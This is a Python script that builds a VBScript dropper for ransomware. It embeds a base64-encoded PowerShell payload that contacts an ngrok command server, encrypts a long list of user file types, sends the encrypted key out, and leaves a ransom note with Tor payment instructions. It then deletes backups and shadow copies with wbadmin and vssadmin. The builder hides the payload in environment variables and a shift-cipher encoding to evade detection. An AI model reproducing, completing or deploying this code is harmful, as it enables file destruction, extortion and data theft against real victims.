import subprocess

full = "ZnVuY3Rpb24gUG9zdFRvU2VydmVyKCAkcXVlcnlzdHJpbmcgKXsgICAKCSRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50OyAgIAoJJGNsaWVudC5DcmVkZW50aWFscyA9IFtTeXN0ZW0uTmV0LkNyZWRlbnRpYWxDYWNoZV06OkRlZmF1bHRDcmVkZW50aWFsczsgICAKCSRjbGllbnQuSGVhZGVycy5BZGQoIkNvbnRlbnQtVHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsgICAKCSRjbGllbnQuRW5jb2RpbmcgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4OyAgIAoJdHJ5eyAgICAgCgkJJHJlc3BvbnNlID0gJGNsaWVudC5VcGxvYWRTdHJpbmcoImh0dHA6Ly84NjE5ZjU5NWEwYmQubmdyb2suaW8vIiwgJHF1ZXJ5c3RyaW5nKTsgICAgIAoJCWlmKCAkcmVzcG9uc2UgLWVxICJvayIgKXsgcmV0dXJuICR0cnVlOyB9ICAgCgl9Y2F0Y2h7fTsgICAKCXJldHVybiAkZmFsc2U7ICAKfTsgCmZ1bmN0aW9uIGV4ZWNDbWQoICRjbWQgKXsgICAKCXRyeSB7IAoJCVN0YXJ0LVByb2Nlc3MgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRmlsZVBhdGggIiRlbnY6Y29tc3BlYyIgLUFyZ3VtZW50TGlzdCAiL2MgJGNtZCIgOyAKCX1jYXRjaHt9OyAKfTsgCgpmdW5jdGlvbiBFbmNyeXB0RmlsZSgkZmlsZUJ5dGVzLCAka2V5LCAkc2FsdCwgJElWICl7ICAgCgkkZW5jcnlwdG9yU2VydmljZSA9IG5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5SaWpuZGFlbE1hbmFnZWQ7ICAgICAgCgkka2V5Qnl0ZXMgPSBbVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGtleSk7ICAgCgkkc2FsdEJ5dGVzID0gW1RleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRzYWx0KTsgICAKCSRlbmNyeXB0b3JTZXJ2aWNlLktleSA9IChuZXctT2JqZWN0IFNlY3VyaXR5LkNyeXB0b2dyYXBoeS5QYXNzd29yZERlcml2ZUJ5dGVzICRrZXlCeXRlcywgJHNhbHRCeXRlcywgIlNIQTEiLCA1KS5HZXRCeXRlcygzMik7ICAgCgkkZW5jcnlwdG9yU2VydmljZS5JViA9IChuZXctT2JqZWN0IFNlY3VyaXR5LkNyeXB0b2dyYXBoeS5TSEExTWFuYWdlZCkuQ29tcHV0ZUhhc2goIFtUZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkSVYpIClbMC4uMTVdOyAgIAoJJGVuY3J5cHRvclNlcnZpY2UuUGFkZGluZz0iWmVyb3MiOyAgCgkkZW5jcnlwdG9yU2VydmljZS5Nb2RlPSJDQkMiOyAgCgkkZW5jcnlwdG9yID0gJGVuY3J5cHRvclNlcnZpY2UuQ3JlYXRlRW5jcnlwdG9yKCk7ICAgCgkkbWVtU3RyZWFtID0gbmV3LU9iamVjdCBJTy5NZW1vcnlTdHJlYW07ICAgCgkkY3J5cHRvU3RyZWFtID0gbmV3LU9iamVjdCBTZWN1cml0eS5DcnlwdG9ncmFwaHkuQ3J5cHRvU3RyZWFtICRtZW1TdHJlYW0sICRlbmNyeXB0b3IsICJXcml0ZSI7ICAKCSRjcnlwdG9TdHJlYW0uV3JpdGUoJGZpbGVCeXRlcywgMCwgJGZpbGVCeXRlcy5MZW5ndGgpOyAgCgkkY3J5cHRvU3RyZWFtLkNsb3NlKCk7ICAKCSRtZW1TdHJlYW0uQ2xvc2UoKTsgICAKCSRlbmNyeXB0b3JTZXJ2aWNlLkNsZWFyKCk7ICAgCglyZXR1cm4gJG1lbVN0cmVhbS5Ub0FycmF5KCk7IAp9CgpGdW5jdGlvbiBDb252ZXJ0LUhleFRvQnl0ZUFycmF5IHsKICAgIFtjbWRsZXRiaW5kaW5nKCldCiAgICBwYXJhbSgKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkSGV4U3RyaW5nCiAgICApCiAgICAkYnl0ZXMgPSBbYnl0ZVtdXTo6bmV3KCRIZXhTdHJpbmcuTGVuZ3RoIC8gMikKICAgIEZvcigkaT0wOyAkaSAtbHQgJEhleFN0cmluZy5MZW5ndGg7ICRpKz0yKXsKICAgICAgICAkYnl0ZXNbJGkvMl0gPSBbY29udmVydF06OlRvQnl0ZSgkSGV4U3RyaW5nLlN1YnN0cmluZygkaSwgMiksIDE2KQogICAgfQogICAgcmV0dXJuICRieXRlcwp9CgpmdW5jdGlvbiBSdW57ICAgCglbUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWRXaXRoUGFydGlhbE5hbWUoJ1N5c3RlbS5TZWN1cml0eScpOyAgCgkkb3JhY2xlUGF0aCA9ICRlbnY6UFVCTElDICsgIlxPcmFjbGVLaXQiOyAKCWlmICggVGVzdC1QYXRoICRvcmFjbGVQYXRoICl7IGV4aXQ7CX07IAoJaWYgKC1ub3QgKFRlc3QtUGF0aCAkb3JhY2xlUGF0aCkpIHsgbWQgJG9yYWNsZVBhdGg7IH0gICAKCSAKCSRndWlkRmlsZSA9ICRvcmFjbGVQYXRoICsgIlxsb2cwMDUudG1wIjsgICAKCSRndWlkPVtzdHJpbmddW2d1aWRdOjpOZXdHdWlkKCk7ICAKCXNjIC1QYXRoICRndWlkRmlsZSAtVmFsdWUgJGd1aWQgLUZvcmNlOyAgCglnaSAkZ3VpZEZpbGUgLUZvcmNlIHwgICV7ICRfLkF0dHJpYnV0ZXMgPSAiSGlkZGVuIiB9OyAKCgkkZXh0ZW5zaW9uID0gKFtzdHJpbmddW2d1aWRdOjpOZXdHdWlkKCkpLlN1YnN0cmluZygwLDYpOyAgCgkka2V5ID0gKGdldC1yYW5kb20gLWNvdW50IDUwIC1pbnB1dCAoNDguLjU3ICsgNjUuLjkwICsgOTcuLjEyMikgfCBmb3JlYWNoLW9iamVjdCAtYmVnaW4geyAkcGFzcyA9ICRudWxsOyB9IC1wcm9jZXNzIHskcGFzcyArPSBbY2hhcl0kXzt9IC1lbmQgeyRwYXNzfSk7ICAgICAKCSRzYWx0PSJYWFggaGFja3MgeW91ISI7ICAgCgkkSVY9IlhYWCBJTklUIjsgIAoJW2J5dGVbXV0ka2V5Qnl0ZXMgPSBbc3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKCRrZXkpOwoJJGNyeXB0b1NlcnZpY2UgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUlNBQ3J5cHRvU2VydmljZVByb3ZpZGVyKDIwNDgpOwoJCgkkcGFyYW1zID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJTQVBhcmFtZXRlcnM7CgkkcGFyYW1zLm1vZHVsdXMgPSBDb252ZXJ0LUhleFRvQnl0ZUFycmF5ICJDRkU3NTgwNDlCNjc0MUY5RDNFNTAzNkQ1MEJERDAxRUJCMkVBREU3MEZGQ0Q5NkVENzcyQ0EyQ0I1MTdFQ0FDQTE2NjFGRUIyMDU5MEFFNTE0M0M4OEZBRDNBQ0U4RDNDN0Q4RENBRkU1NkZGNEExMTc4QzBDRUYyQkFCQUUzNTQ5MUM4MkIzODgwNTRDOEJDMDQyRkJERTg5Rjg4Mzk0QjNEMkRGQ0NFQjU0NTc5NjlDOTlFODdEMUE2RTVDM0E0RTk3NjBCOUQzRTk5MEJFNkIyRTdDQjQ3Qzg4ODM1NkVCNEU0MDg5MjU4RDhBMjc4OTlDNzI5MkE2QkY4NTFFQzBCNTFDMEEyMTIwRDQxMEY1RDNCMTk5QjU0REIzMTdGMjdFQUZGN0M3QkZBMDg0OENFNEM4NzZEMTM1MjIzRDAxQjZBNjZCNTEzQkY0NTY3NDE3NzZFNjM2RTc2MDBCMEVGOUFBMjlCMzBGQzlBNzFERTU1NkYyRjQ4M0I1QjNBODg2RkY4NEI0Nzk5MEE0QkJDMjEyQTkyMUI4MDMyQjUzRDczQkNEQ0I2RjRBQzJGMUMwQkZFOTgxRDIxNkFDMTE4OTFDNkIyODNGOTVBRTUyRDFCOEQxRTMwNTFFNUFFQjc3OEEzMTYyNDk3NjYwMDBBQUREODVDMTY4QTIzQiI7CgkkcGFyYW1zLmV4cG9uZW50ID0gKCAweDAxLCAweDAwLCAweDAxICk7CgkkY3J5cHRvU2VydmljZSA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5SU0FDcnlwdG9TZXJ2aWNlUHJvdmlkZXIoMjA0OCk7CgkkY3J5cHRvU2VydmljZS5JbXBvcnRQYXJhbWV0ZXJzKCRwYXJhbXMpOwoJCgkkZW5jcnlwdGVkS2V5QmFzZTY0ID0gW3N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoICRjcnlwdG9TZXJ2aWNlLkVuY3J5cHQoJGtleUJ5dGVzICwgJGZhbHNlKSk7ICAgCgkkc2VydmVyUmVzcG9uc2UgPSBQb3N0VG9TZXJ2ZXIoImd1aWQ9JGd1aWQmZXh0PSRleHRlbnNpb24mZUtleTY0PSIgKyAoW3VyaV06OkVzY2FwZURhdGFTdHJpbmcoJGVuY3J5cHRlZEtleUJhc2U2NCkpKTsgICAKCWlmKCAtTm90ICRzZXJ2ZXJSZXNwb25zZSApeyAgICAgIAoJCWV4aXQ7ICAgCgl9ICAKCSRodG1sUGFnZSA9ICdQR2d4UGtGc2JDQjViM1Z5SUdacGJHVnpJSGRoY3lCbGJtTnllWEIwWldRaFBDOW9NVDRLSUNBOGFESWdJSE4wZVd4bFBTZGpiMnh2Y2pwa1lYSnJjbVZrSno0OFlqNVpaWE1zSUZsdmRTQmpZVzRnUkdWamNubHdkQ0JHYVd4bGN5QkZibU55ZVhCMFpXUWhJU0U4TDJJK1BDOW9NajRLSUNBOGNENVpiM1Z5SUhCbGNuTnZibUZzSUVsRU9pQThZajRsWjNWcFpDVThMMkkrUEM5d1Bnb2dJRHh3UGpFdUlFUnZkMjVzYjJGa0lGUnZjaUJpY205M2MyVnlJQzBnUEdFZ2FISmxaajBuYUhSMGNITTZMeTkzZDNjdWRHOXljSEp2YW1WamRDNXZjbWN2Wkc5M2JteHZZV1F2Sno1b2RIUndjem92TDNkM2R5NTBiM0p3Y205cVpXTjBMbTl5Wnk5a2IzZHViRzloWkM4OEwyRStQQzl3UGdvZ0lEeHdQakl1SUVsdWMzUmhiR3dnVkc5eUlHSnliM2R6WlhJOEwzQStDaUFnUEhBK015NGdUM0JsYmlCVWIzSWdRbkp2ZDNObGNqd3ZjRDRLSUNBOGNENDBMaUJQY0dWdUlHeHBibXNnYVc0Z1ZFOVNJR0p5YjNkelpYSTZJQ0E4WWo1b2RIUndPaTh2ZG5SM2NtcHplbmh6Y0c5NmJUWXpOamQxWVd4dGQzQnpibkZrZUdGbmJHcDZNM2cxYWpkcWIzaGpiamN5Y21KbE5YWm9OWFEyWVdRdWIyNXBiMjR2UEM5aVBqd3ZjRDRLSUNBOGNENDFMaUJHYjJ4c2IzY2dkR2hsSUdsdWMzUnlkV04wYVc5dWN5QnZiaUIwYUdseklIQmhaMlU4TDNBK0NpQWdQR2d5UGlvcUtpb3FJRmRoY201cGJtY3FLaW9xS2p3dmFESStDaUFnUEhBK1YyVWdhR0YyWlNCaElHTnZjSGtnYjJZZ1lXeHNJSGx2ZFhJZ2IzSnBaMmx1WVd3Z1ptbHNaWE11SUVsbUlIbHZkU0JrYjI0bmRDQm1iMnhzYjNjZ2RHaGxJR2x6ZEhKMVkzUnBiMjRzSUhSb1pYa2dZMkZ1SUdKbElIVnpaV1FnWVdkaGFXNXpkQ0I1YjNVOEwzQStDaUFnUEhBK1JHOGdibTkwSUhKbGJtRnRaU0JtYVd4bGN6d3ZjRDRLSUNBOGNENUVieUJ1YjNRZ2RISjVJSFJ2SUdKaFkyc2dlVzkxY2lCa1lYUmhJSFZ6YVc1bklIUm9hWEprTFhCaGNuUjVJSE52Wm5SM1lYSmxMQ0JwZENCdFlYa2dZMkYxYzJVZ2NHVnliV0Z1Wlc1MElHUmhkR0VnYkc5emN5aEpaaUI1YjNVZ1pHOGdibTkwSUdKbGJHbGxkbVVnZFhNc0lHRnVaQ0J6ZEdsc2JDQjBjbmtnZEc4Z0xTQnRZV3RsSUdOdmNHbGxjeUJ2WmlCaGJHd2dabWxzWlhNZ2MyOGdkR2hoZENCM1pTQmpZVzRnYUdWc2NDQjViM1VnYVdZZ2RHaHBjbVF0Y0dGeWRIa2djd3B2Wm5SM1lYSmxJR2hoY20xeklIUm9aVzBwUEM5d1Bnb2dJRHh3UGtSbFkyOWtaWEp6SUc5bUlHOTBhR1Z5SUhWelpYSnpJR2x6SUc1dmRDQnpkV2wwWVdKc1pTQjBieUJpWVdOcklIbHZkWElnWm1sc1pYTWdMU0JsYm1OeWVYQjBhVzl1SUd0bGVTQnBjeUJqY21WaGRHVmtJRzl1SUhsdmRYSWdZMjl0Y0hWMFpYSWdkMmhsYmlCMGFHVWdjSEp2WjNKaGJTQnBjeUJzWVhWdVkyaGxaQ0F0SUdsMElHbHpJSFZ1YVhGMVpTNDhMM0ErJzsgIAoJJGh0bWxQYWdlID0gKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCAkaHRtbFBhZ2UgKSApIC1yZXBsYWNlICIlZ3VpZCUiLCAkZ3VpZCApOyAKCSRyZXN1bHQgPSAwOyAgIAoJUG9zdFRvU2VydmVyKCJndWlkPSRndWlkJnN0YXR1cz1zdGFydCZyZXM9MCIpOyAgCgoJJGRyaXZlID0gR2V0LVBTRHJpdmV8V2hlcmUtT2JqZWN0IHskXy5GcmVlIC1ndCA1MDAwMH18U29ydC1PYmplY3QgLURlc2NlbmRpbmc7Cglmb3JlYWNoKCRmb2xkZXIgaW4gJGRyaXZlKXsgIAoJCXRyeSB7ICAgICAgIAoJCQlnY2kgJGZvbGRlci5yb290IC1SZWN1cnNlIC1JbmNsdWRlICIqLjd6IiwiKi5tcDQiLCIqLnNxbCIsIioucmFyIiwiKi5tNGEiLCIqLndtYSIsIiouYXZpIiwiKi53bXYiLCIqLmNzdiIsIiouZDNkYnNwIiwiKi56aXAiLCIqLnNpZSIsIiouc3VtIiwiKi5pYmFuayIsIioudDEzIiwiKi50MTIiLCIqLnFkZiIsIiouZ2RiIiwiKi50YXgiLCIqLnBrcGFzcyIsIiouYmM2IiwiKi5iYzciLCIqLmJrcCIsIioucWljIiwiKi5ia2YiLCIqLnNpZG4iLCIqLnNpZGQiLCIqLm1kZGF0YSIsIiouaXRsIiwiKi5pdGRiIiwiKi5pY3hzIiwiKi5odnBsIiwiKi5ocGxnIiwiKi5oa2RiIiwiKi5tZGJhY2t1cCIsIiouc3luY2RiIiwiKi5naG8iLCIqLmNhcyIsIiouc3ZnIiwiKi5tYXAiLCIqLndtbyIsIiouaXRtIiwiKi5zYiIsIiouZm9zIiwiKi5tb3YiLCIqLnZkZiIsIiouenRtcCIsIiouc2lzIiwiKi5zaWQiLCIqLm5jZiIsIioubWVudSIsIioubGF5b3V0IiwiKi5kbXAiLCIqLmJsb2IiLCIqLmVzbSIsIioudmNmIiwiKi52dGYiLCIqLmRhemlwIiwiKi5mcGsiLCIqLm1seCIsIioua2YiLCIqLml3ZCIsIioudnBrIiwiKi50b3IiLCIqLnBzayIsIioucmltIiwiKi53M3giLCIqLmZzaCIsIioubnRsIiwiKi5hcmNoMDAiLCIqLmx2bCIsIiouc254IiwiKi5jZnIiLCIqLmZmIiwiKi52cHBfcGMiLCIqLmxyZiIsIioubTIiLCIqLm1jbWV0YSIsIioudmZzMCIsIioubXBxZ2UiLCIqLmtkYiIsIiouZGIwIiwiKi5kYmEiLCIqLnJvZmwiLCIqLmhreCIsIiouYmFyIiwiKi51cGsiLCIqLmRhcyIsIiouaXdpIiwiKi5saXRlbW9kIiwiKi5hc3NldCIsIiouZm9yZ2UiLCIqLmx0eCIsIiouYnNhIiwiKi5hcGsiLCIqLnJlNCIsIiouc2F2IiwiKi5sYmYiLCIqLnNsbSIsIiouYmlrIiwiKi5lcGsiLCIqLnJnc3MzYSIsIioucGFrIiwiKi5iaWciLCIqd2FsbGV0IiwiKi53b3RyZXBsYXkiLCIqLnh4eCIsIiouZGVzYyIsIioucHkiLCIqLm0zdSIsIiouZmx2IiwiKi5qcyIsIiouY3NzIiwiKi5yYiIsIioucG5nIiwiKi5qcGVnIiwiKi50eHQiLCIqLnA3YyIsIioucDdiIiwiKi5wMTIiLCIqLnBmeCIsIioucGVtIiwiKi5jcnQiLCIqLmNlciIsIiouZGVyIiwiKi54M2YiLCIqLnNydyIsIioucGVmIiwiKi5wdHgiLCIqLnIzZCIsIioucncyIiwiKi5yd2wiLCIqLnJhdyIsIioucmFmIiwiKi5vcmYiLCIqLm5ydyIsIioubXJ3cmVmIiwiKi5tZWYiLCIqLmVyZiIsIioua2RjIiwiKi5kY3IiLCIqLmNyMiIsIiouY3J3IiwiKi5iYXkiLCIqLnNyMiIsIiouc3JmIiwiKi5hcnciLCIqLjNmciIsIiouZG5nIiwiKi5qcGUiLCIqLmpwZyIsIiouY2RyIiwiKi5pbmRkIiwiKi5haSIsIiouZXBzIiwiKi5wZGYiLCIqLnBkZCIsIioucHNkIiwiKi5kYmYiLCIqLm1kZiIsIioud2IyIiwiKi5ydGYiLCIqLndwZCIsIiouZHhnIiwiKi54ZiIsIiouZHdnIiwiKi5wc3QiLCIqLmFjY2RiIiwiKi5tZGIiLCIqLnBwdG0iLCIqLnBwdHgiLCIqLnBwdCIsIioueGxrIiwiKi54bHNiIiwiKi54bHNtIiwiKi54bHN4IiwiKi54bHMiLCIqLndwcyIsIiouZG9jbSIsIiouZG9jeCIsIiouZG9jIiwiKi5vZGIiLCIqLm9kYyIsIioub2RtIiwiKi5vZHAiLCIqLm9kcyIsIioub2R0IiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8ICV7ICAKCQkJCXRyeSB7ICAgICAgICAgCgkJCQkJaWYoICRfLmxlbmd0aCAtbmUgMCApeyAgICAKCQkJCQkJJGZpbGU9W2lvLmZpbGVdOjpPcGVuKCRfLCAnT3BlbicsICdSZWFkV3JpdGUnKTsgICAgIAoJCQkJCQlpZiAoJGZpbGUuTGVuZ3RoIC1sdCAiNDA5NjAiKXsgICAgICAgICAKCQkJCQkJCSRieXRlc1RvRW5jb2RlPSRmaWxlLkxlbmd0aDsgICAgCgkJCQkJCX0KCQkJCQkJZWxzZXsgICAgICAgICAgICAgICAKCQkJCQkJCSRieXRlc1RvRW5jb2RlPSI0MDk2MCI7ICAgCgkJCQkJCX0gICAgIAoJCQkJCQlbYnl0ZVtdXSRmaWxlQnl0ZXMgPSBuZXctb2JqZWN0IGJ5dGVbXSAkYnl0ZXNUb0VuY29kZTsgICAKCQkJCQkJJGZpbGUuUG9zaXRpb249JzAnOyAgICAgICAKCQkJCQkJJHJlYWRGaWxlID0gJGZpbGUuUmVhZCgkZmlsZUJ5dGVzLCAwLCAkZmlsZUJ5dGVzLkxlbmd0aCk7IAoJCQkJCQkkZW5jcnlwdGVkQnl0ZXMgPSBFbmNyeXB0RmlsZSAkZmlsZUJ5dGVzICRrZXkgJHNhbHQgJElWOyAgICAgIAoJCQkJCQkkZmlsZS5Xcml0ZSgkZW5jcnlwdGVkQnl0ZXMsIDAsICRlbmNyeXB0ZWRCeXRlcy5MZW5ndGgpOyAgIAoJCQkJCQkkZmlsZS5DbG9zZSgpOyAgICAgICAgCgkJCQkJCSRuZXdOYW1lID0gJF8uTmFtZSsiLiRleHRlbnNpb24iOyAgICAgCgkJCQkJCXRyeXsgCgkJCQkJCQlyZW4gLVBhdGggJCgkXy5GdWxsTmFtZSkgLU5ld05hbWUgJG5ld05hbWUgLUZvcmNlOyAKCQkJCQkJfWNhdGNoe307ICAgICAgICAKCQkJCQkJJHJlYWRNZVBhdGggPSAkKCRfLkRpcmVjdG9yeU5hbWUgICsgIlxSRUFEX01FX05PVy5odG0iKSA7ICAgIAoJCQkJCQlpZighKFRlc3QtUGF0aCAkcmVhZE1lUGF0aCkpeyAgICAgICAgICAKCQkJCQkJCXRyeXsgCgkJCQkJCQkJc2MgLVBhdGggJHJlYWRNZVBhdGggLVZhbHVlICRodG1sUGFnZSAtRm9yY2U7IAoJCQkJCQkJfWNhdGNoe307ICAgICAgICAgCgkJCQkJCQl0cnl7IAoJCQkJCQkJCXNjIC1QYXRoICR0ZW1wUGF0aCAtVmFsdWUgJChHZXQtRGF0ZSkgLUZvcmNlOyAKCQkJCQkJCX1jYXRjaHt9OyAgICAgICAgCgkJCQkJCX0gICAgICAgICAgICAKCQkJCQkJJHJlc3VsdCsrOyAgICAKCQkJCQl9ICAgICAgIAoJCQkJfWNhdGNoe307ICAgICAgIAoJCQl9ICAgICAKCQl9Y2F0Y2h7fTsgIAoJfSAgCglQb3N0VG9TZXJ2ZXIgKCJndWlkPSRndWlkJnN0YXR1cz1kb25lJnJlcz0iICsgJHJlc3VsdCApOwoJCglleGVjQ21kKCd3YmFkbWluIGRlbGV0ZSBjYXRhbG9nIC1xdWlldCcpOyAKCWV4ZWNDbWQoJ3diYWRtaW4gZGVsZXRlIHN5c3RlbXN0YXRlYmFja3VwJyk7IAoJZXhlY0NtZCgnd2JhZG1pbiBkZWxldGUgYmFja3VwJyk7ICAgCglleGVjQ21kKCd2c3NhZG1pbiBkZWxldGUgc2hhZG93cyAvYWxsIC9xdWlldCcpOwp9IApSdW47"

f = open("../script_alternative.vbs", "w")
f.write("Set osi = CreateObject(\"Wscript.shell\")\n")
f.write("Set wev = osi.Environment(\"Process\")\n")

substr = ""
varIndex = 0
lines = []
vars = []
for index, char in enumerate(full, start=1):
    substr += char
    if index % 1000 == 0:
        var = "XXX" + str(varIndex)
        lines.append("wev(\"" + var + "\") = \"" + substr + "\"\n")
        substr = ""
        varIndex += 1
        vars.append(var)

var = "XXX" + str(varIndex)
lines.append("wev(\"" + var + "\") = \"" + substr + "\"\n")
vars.append(var)
f.writelines(lines)

xxx = ""
for var in vars:
    xxx += "$env:" + var + "+"
xxx = xxx[:-1]

output = subprocess.check_output(['C:\\Windows\\System32\\cscript.exe', "/nologo", "../MakeScript/vbs-encrypter.vbs", xxx]).strip()
f.write('txt = "'+ output.decode("utf-8") + '"\n')
f.write("osi.run decode(txt), 1, True\n")
f.write("""
function decode(s)
    For i = 1 To Len(s)
        newtxt = Mid(s,i,1)
        newtxt = Chr(Asc(newtxt) - 3)
        coded = coded + (newtxt)
    Next
    decode = coded
End function""")

f.close()